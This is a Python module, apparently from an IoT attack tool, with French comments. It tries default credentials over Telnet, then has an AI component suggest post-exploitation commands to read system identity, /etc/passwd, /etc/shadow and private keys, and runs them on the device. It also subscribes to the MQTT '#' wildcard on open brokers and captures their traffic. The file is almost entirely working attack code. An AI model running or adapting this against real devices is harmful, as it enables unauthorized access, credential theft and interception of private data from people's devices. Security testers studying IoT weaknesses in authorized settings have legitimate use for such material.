import telnetlib
import paho.mqtt.client as mqtt
import time
# Ajout de l'importation pour l'analyseur IA
from .ai_analyzer import get_ai_analysis

def exploit_telnet(ip, username, password):
    """
    Tente d'ex√©cuter des commandes sur une cible Telnet.
    L'IA sugg√®re maintenant des commandes pertinentes pour prouver l'impact.
    """
    print(f"[*] Tentative d'exploitation Telnet sur {ip} avec {username}:{password}...")
    
    try:
        tn = telnetlib.Telnet(ip, timeout=5)
        # Processus de connexion
        tn.read_until(b"login: ", timeout=3)
        tn.write(username.encode('ascii') + b"\n")
        if password:
            tn.read_until(b"Password: ", timeout=3)
            tn.write(password.encode('ascii') + b"\n")
            
        # Attendre le prompt de connexion
        prompt_symbol = tn.read_until(b"$", timeout=3) # On capture le prompt ($ ou #)

        # Demander √† l'IA de sugg√©rer des commandes
        prompt_ai = f"""
        J'ai obtenu un acc√®s shell sur un appareil IoT via Telnet.
        Le prompt du shell est '{prompt_symbol.decode(errors='ignore').strip()}'.
        
        Sugg√®re-moi une liste de 3 commandes √† ex√©cuter pour :
        1.  Confirmer l'identit√© du syst√®me (ex: version du noyau, distribution).
        2.  Rechercher des fichiers de configuration ou des secrets (ex: /etc/passwd, /etc/shadow, cl√©s priv√©es).
        Ne fournis que les commandes, une par ligne.
        """
        print("  [üß†] L'IA sugg√®re des commandes de post-exploitation...")
        ai_commands_str = get_ai_analysis(prompt_ai, max_length=128)
        
        # Commandes de base au cas o√π l'IA √©choue
        base_commands = [b"uname -a", b"id", b"cat /etc/passwd"]
        ai_commands = [cmd.strip().encode('ascii') for cmd in ai_commands_str.split('\n') if cmd.strip()]
        
        if ai_commands:
            print(f"  [+] Suggestions de l'IA : {[cmd.decode() for cmd in ai_commands]}")
            commands_to_try = ai_commands + base_commands
        else:
            commands_to_try = base_commands
        
        # Ex√©cuter les commandes sugg√©r√©es
        for command in commands_to_try:
            tn.write(command + b"\n")
            # Lire le r√©sultat de la commande
            output = tn.read_until(prompt_symbol, timeout=3).decode('ascii', errors='ignore')
            
            # Si on a un r√©sultat significatif, on a r√©ussi
            if output and command.decode() not in output:
                # On nettoie le r√©sultat pour l'affichage
                clean_output = "\n".join(output.split("\n")[1:-1]).strip()
                success_msg = f"[!] EXPLOIT R√âUSSI: Commande '{command.decode()}' ex√©cut√©e. R√©sultat:\n--- DEBUT ---\n{clean_output}\n--- FIN ---"
                print(success_msg)
                tn.close()
                return clean_output
                
        tn.close()
        return None

    except Exception as e:
        print(f"[-] L'exploitation Telnet a √©chou√©: {e}")
        return None 

def exploit_mqtt(ip):
    """
    Tente de s'abonner au topic wildcard '#' sur un serveur MQTT ouvert
    et capture quelques messages pour prouver le flux de donn√©es.
    """
    print(f"[*] Tentative d'exploitation MQTT sur {ip}: √©coute du topic '#'...")
    captured_messages = []
    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            client.subscribe("#")
        else:
            client.disconnect()
    def on_message(client, userdata, msg):
        payload = msg.payload.decode('utf-8', errors='ignore')
        print(f"  [+] Message re√ßu sur le topic '{msg.topic}': {payload}")
        captured_messages.append({'topic': msg.topic, 'payload': payload})
        if len(captured_messages) >= 5:
            client.disconnect()
    client = mqtt.Client("iotbreaker_exploit")
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(ip, 1883, 5)
        client.loop_start()
        time.sleep(10)
        client.loop_stop()
        if captured_messages:
            print(f"[!] EXPLOIT R√âUSSI: {len(captured_messages)} message(s) ont √©t√© intercept√©(s) sur le broker MQTT.")
            return captured_messages
        else:
            print("[-] Aucun message n'a √©t√© captur√© sur le broker MQTT pendant le temps d'√©coute.")
            return None
    except Exception as e:
        print(f"[-] L'exploitation MQTT a √©chou√©: {e}")
        return None

def run(vulnerability_info):
    """
    Fonction principale d'exploitation.
    Prend en param√®tre un dictionnaire contenant les informations de vuln√©rabilit√©.
    """
    print(f"[*] D√©marrage de l'exploitation pour {vulnerability_info.get('ip', 'Unknown')}...")
    
    ip = vulnerability_info.get('ip', 'Unknown')
    vuln_type = vulnerability_info.get('type', 'Unknown')
    
    if 'telnet' in vuln_type.lower():
        # Test avec des identifiants par d√©faut
        default_creds = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('admin', 'password'),
            ('root', 'password')
        ]
        
        for username, password in default_creds:
            result = exploit_telnet(ip, username, password)
            if result:
                return {
                    'ip': ip,
                    'type': 'Telnet Exploit',
                    'severity': 'CRITICAL',
                    'description': f'Exploitation Telnet r√©ussie avec {username}:{password}',
                    'result': result
                }
    
    elif 'mqtt' in vuln_type.lower():
        result = exploit_mqtt(ip)
        if result:
            return {
                'ip': ip,
                'type': 'MQTT Exploit',
                'severity': 'HIGH',
                'description': 'Exploitation MQTT r√©ussie - Messages intercept√©s',
                'result': result
            }
    
    print(f"[-] Aucune exploitation r√©ussie pour {ip}")
    return None 